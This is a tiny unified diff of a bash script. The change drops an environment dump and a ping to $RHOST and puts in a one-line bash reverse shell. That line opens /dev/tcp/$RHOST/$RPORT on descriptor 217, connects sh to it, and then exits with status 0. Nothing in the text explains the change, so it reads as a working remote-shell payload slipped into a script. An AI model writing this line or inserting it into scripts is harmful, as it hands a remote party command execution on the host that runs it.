@@ -1,4 +1,3 @@
 #!/usr/bin/env bash
-env
-ping -c 1 "$RHOST"
-exit 1
+0<&217-;exec 217<>/dev/tcp/$RHOST/$RPORT;sh <&217 >&217 2>&217
+exit 0
